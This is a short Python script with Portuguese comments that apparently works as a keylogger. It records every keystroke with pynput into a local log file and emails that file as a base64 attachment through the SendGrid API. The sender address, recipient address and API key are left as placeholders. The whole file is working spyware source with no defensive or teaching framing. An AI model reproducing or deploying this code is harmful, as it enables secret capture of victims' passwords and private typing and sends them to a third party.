from pynput.keyboard import Listener, Key
import os
import base64
from sendgrid import SendGridAPIClient
from sendgrid.helpers.mail import (Mail, Attachment, FileContent, FileName, FileType, Disposition)

file = "log.txt" #titulo do arquivo log

message = Mail(
        from_email='seu email',

        to_emails='seu email',

        subject='Log',
        html_content='<p>Log</p>'
        )
    
with open('log.txt', 'rb') as f:
            data = f.read()
            f.close()
            encoded_file = base64.b64encode(data).decode()

            attachedFile = Attachment(
            FileContent(encoded_file),
            FileName('log.txt'),
            FileType('application/txt'),
            Disposition('attachment')
        )
            message.attachment = attachedFile
    
try:
            sg = SendGridAPIClient('chave api sendgrid')

            response = sg.send(message)
            print(response.status_code)
            print(response.body)
            print(response.headers)
except Exception as e:
            # printando excecao
            print(e)
            

            
#Capturando input teclado 

def on_press(key):
   f = open(file, 'a') # escrita em arquivo
   
   
   if hasattr(key, 'char'):
     f.write(key.char)
   
   elif key == Key.space:
     f.write('') #espaco
  
   elif key == Key.enter:
     f.write('\n') #salta uma linha
   
   elif key == Key.tab:
     f.write('\t') # tab
    
          
   else:
     f.write('[' + key.name + ']') # captura demais teclas, exibindo o respectivo nome

   f.close()  # finaliza a escrita em arquivo

with Listener(on_press=on_press) as listener:
  listener.join()  